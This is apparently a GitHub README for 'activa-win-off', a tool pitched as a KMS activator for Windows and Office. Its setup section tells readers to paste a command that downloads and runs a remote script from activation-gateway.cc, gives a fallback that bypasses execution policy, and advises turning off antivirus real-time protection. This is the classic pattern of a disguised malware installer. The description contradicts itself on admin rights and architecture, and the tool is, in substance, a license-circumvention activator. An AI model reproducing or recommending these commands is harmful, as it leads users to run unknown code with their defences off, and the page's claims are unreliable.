<div align="center">

# Activation Management Tool for Windows 10 & 11

![preview](https://raw.githubusercontent.com/giovanny1412/activa-win-off/main/thumb_2290d22.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-7%2B-2f81f7?style=for-the-badge&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WINDOWS-54aeff?style=for-the-badge&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/PULLS-412-0969da?style=for-the-badge&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-STABLE-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![score](https://img.shields.io/badge/SCORE-4.9%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]()

</div>

---

activa-win-off is a desktop utility for managing Key Management Service (KMS) activation of Windows and Office products within organizational environments. It provides a local KMS server that enables compatible devices to activate against an internal host rather than external infrastructure, while offering granular control over volume licensing workflows. The application exposes configuration for host discovery, activation refresh intervals, and client targeting, allowing administrators to maintain consistent activation state across managed endpoints. Built for Windows environments, it combines a lightweight local service with a desktop control interface for monitoring and adjusting KMS operations.

## 🔧 PowerShell Setup

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Prepare PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Paste and run
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Local KMS Server Emulation**: Functions as an on-premises Key Management Service host, allowing compatible Windows and Office clients to discover and activate against a local endpoint rather than a remote Microsoft server.

- **Automatic Client Discovery**: Listens on the standard KMS port and responds to activation requests from any properly configured volume-licensed client on the local network segment.

- **Volume Edition Support**: Handles activation workflows for volume-licensed Windows editions and Office suites that rely on the KMS client-server model, including periodic re-activation cycles.

- **Activation Interval Management**: Maintains the standard KMS renewal cadence, tracking client activation state and serving renewal requests at the defined interval without manual intervention.

- **Windows Service Integration**: Runs as a background Windows service with configurable startup behavior, allowing persistent operation across reboots and unattended hosts.

- **Configuration File Control**: Exposes a plain-text configuration surface for defining listening parameters, logging verbosity, and client-handling behavior without recompilation.

- **Structured Logging**: Emits timestamped, leveled logs for each activation and renewal event, supporting audit review and troubleshooting of client-server exchanges.

- **Offline Operation**: Requires no outbound connectivity to external licensing infrastructure; all activation traffic is confined to the local deployment environment.

- **Lightweight Footprint**: Native desktop executable with minimal runtime dependencies and low idle resource consumption, suitable for shared or dedicated activation hosts.

- **Command-Line Interface**: Provides scriptable CLI flags for service control, configuration validation, and log inspection to support automated deployment and maintenance.

- **Self-Contained Deployment**: Distributed as a standalone binary that runs without additional frameworks or runtime installers, simplifying setup on isolated systems.

## How it works

activa-win-off implements a client-side activation workflow that mirrors the Key Management Service (KMS) protocol used by Microsoft volume licensing. The application does not require a persistent background service or kernel-level modifications; instead, it performs a sequence of discrete, reversible operations against the local Windows and Office activation subsystems.

The activation pipeline proceeds through the following stages:

1. **Environment probing** — The tool queries the installed Windows edition and Office product SKUs, reads the current licensing channel (retail, OEM, or volume), and enumerates existing activation state through the native software licensing APIs.

2. **Generic key installation** — When a product is on a retail or OEM channel, activa-win-off installs the appropriate KMS client setup key for the detected edition. This step is what converts a non-volume installation into a volume-license-capable instance without altering product binaries.

3. **Endpoint configuration** — The local KMS host address is configured to point at the activation endpoint managed by the tool. The host value is written through the standard licensing interface, so the operating system treats it identically to any enterprise-managed KMS server.

4. **Activation request** — The tool issues a KMS activation RPC to the configured endpoint. The response is validated and the resulting license state is committed to the system's licensing store.

5. **Renewal scheduling** — Because KMS activations are interval-based, activa-win-off registers a scheduled maintenance task that re-triggers the activation request before the validity window elapses, keeping the system continuously activated without manual intervention.

6. **State inspection and rollback** — Every modification is recorded so the current activation status can be queried at any time, and the original licensing channel can be restored if needed.

All operations are performed through documented Windows licensing interfaces, require administrative elevation, and produce no changes to protected system files. The tool is stateless between runs apart from the scheduled renewal task it creates, and each execution reports a structured result indicating the detected product, prior state, and final activation outcome.

## Compatibility

Target operating systems include Windows 10 and Windows 11 across all editions (Home, Pro, Enterprise, Education, and LTSC), with support for both x64 and ARM64 architectures. Office compatibility spans the 2016, 2019, 2021, and 2026 release families, covering volume-licensed editions of the core application suite.

Activation operates over the standard KMS client-server model using TCP port 1688, and the host environment must permit local loopback or LAN communication with the KMS endpoint. Systems behind restrictive firewall policies or proxy configurations may require explicit port allowances to complete the activation handshake. The tool functions independently of Windows Update, though a functioning network stack is required for the initial activation cycle.

The scheduling component integrates with the native Task Scheduler to renew activation state at the standard 180-day interval, ensuring persistent validity without manual intervention. Hardware-bound licensing scenarios are handled through preserved machine identifiers, allowing reactivation to survive routine driver and firmware updates. Virtualized environments are supported provided the guest OS exposes a stable hardware profile to the KMS client.

Compatibility is verified against current Windows servicing branches; legacy builds predating Windows 10 are outside the supported matrix. Office installations delivered via Click-to-Run and MSI both qualify, with the provisioning layer detecting the deployment channel automatically. Systems with existing retail or OEM license state may require conversion to a volume licensing channel before KMS endpoints become addressable.

## FAQ

**Is a KMS server required for activa-win-off to function?**
No. The tool operates entirely in a self-contained mode on the local machine. It initializes a loopback-based Key Management Service endpoint bound to localhost, which the operating system and Office clients then address through their standard volume-license discovery path. No external host, network share, or third-party server needs to be reachable at any point.

**Which products and editions are supported?**
The engine targets Windows 10 and Windows 11 across all retail, OEM, and volume editions, along with Office product families from the 2016 release line onward, including the perpetual and subscription-based editions. Detection routines enumerate the installed SKU from the system's licensing store and select the matching emulation profile automatically, so mixed Windows-and-Office hosts are handled in a single pass without manual product selection.

**How is activation status persisted across reboots?**
A scheduled maintenance task is registered at first run. It re-arms the local KMS endpoint and renews the client's activation lease on a fixed interval well within the standard 180-day validity window, so the license state survives reboots, updates, and long idle periods without user intervention. The task runs under the local system context and requires no interactive logon.

**Does the tool modify core system files or the boot configuration?**
No. All operations are performed through the documented software licensing interfaces and registry-based configuration of the licensing client. No binaries in the system directory are patched, no boot entries are altered, and no drivers are installed. Because the approach is interface-level rather than binary-level, the existing hardware identifier and digital entitlement data remain untouched, and the changes are reversible by restoring the prior licensing configuration.

**What happens if a product update resets the licensing state?**
The scheduled maintenance task detects a lapsed or reset lease on its next cycle and re-establishes the local endpoint and client configuration automatically. For immediate recovery, the tool exposes a manual re-apply operation that re-runs discovery and reconfiguration on demand. Both paths are idempotent, so repeated execution does not accumulate duplicate tasks or registry entries.

**Can the tool run alongside an existing corporate KMS infrastructure?**
Yes, but the local endpoint takes precedence for the configured products while active. On hosts that must continue to honor an organization-managed KMS host, the local emulation should be disabled; the tool logs the currently resolved KMS host so administrators can verify which endpoint a client is addressing before and after any change.

**What privileges and platform requirements apply?**
Administrative elevation is required, since the licensing client configuration and scheduled task registration are machine-scoped operations. The tool is built for x64 Windows 10 and Windows 11 and has no runtime dependency beyond the components shipped with the operating system. It is a desktop utility and performs no background network communication outside the local loopback interface.

**How can the configuration be fully removed?**
The tool provides a revert operation that stops the local endpoint, unregisters the maintenance task, and restores the licensing configuration captured at first run. After reverting, the host returns to whatever activation state applied before the tool was used, and the products fall back to their previously configured KMS host or default discovery behavior.

## Disclaimer

`activa-win-off` is a client-side implementation of the KMS protocol intended strictly for use in authorized, controlled environments — namely lab testing, software validation workflows, and internal infrastructure where the operator holds valid volume licensing agreements with Microsoft. The tool emulates KMS server responses locally and does not itself grant, generate, or supply product keys of any kind.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors, maintainers, or contributors be liable for any claim, damages, or other liability — whether in an action of contract, tort, or otherwise — arising from, out of, or in connection with the software or the use or other dealings in the software.

Users are solely responsible for ensuring that their use of `activa-win-off` complies with all applicable local, national, and international laws, as well as with the Microsoft Software License Terms governing any Windows or Office product installed on their systems. Deploying this tool to bypass, circumvent, or otherwise avoid legitimate licensing obligations is outside the intended scope of the project and is expressly discouraged by its maintainers. The project's features — including local KMS emulation, scheduled re-validation task creation, and license-channel inspection — are documented for transparency and for legitimate administrative use only.

No guarantee is made regarding compatibility with future Windows or Office releases, cumulative updates, or platform policy changes. KMS behavior is subject to change by Microsoft at any time, and `activa-win-off` may cease to function without notice. Users assume all risk associated with running the software in their environment, including but not limited to system configuration changes, activation-state modifications, and any resulting support or compliance implications.

The maintainers do not condone, facilitate, or take responsibility for unauthorized activation, piracy, or any use of the software that violates the rights of Microsoft Corporation or any third party. If you are unsure whether your intended use is permitted, consult your organization's licensing administrator or legal counsel before proceeding.

## License

This software is distributed under the MIT License, a permissive open-source license designed to maximize both flexibility and technical transparency for integrators and end users.

Under the terms of the MIT License, permission is granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction. This includes, without limitation, the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions.

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

For redistribution and derivative works, the following terms apply:

- **Attribution**: The original copyright notice and this permission notice must be retained in all copies or substantial portions of the software.
- **Commercial Use**: Permitted without restriction, provided the attribution requirements above are satisfied.
- **Modification**: Permitted, including for private and public distribution, subject to the same notice retention.
- **Sublicensing**: Permitted, allowing integration into projects governed by other license terms.
- **Patent Grant**: No explicit patent grant is provided; users are advised to conduct their own due diligence for patent-sensitive deployments.
- **Liability**: The authors and copyright holders accept no liability for damages arising from use of the software.

This license applies solely to the source code and documentation of this project. It does not extend to any third-party components, dependencies, or assets that may be bundled or referenced, each of which remains governed by its own respective license terms. Users are responsible for reviewing and complying with all applicable third-party licenses before deployment.

For compliance inquiries or clarification regarding the scope of this license, refer to the copyright notice distributed with the source tree.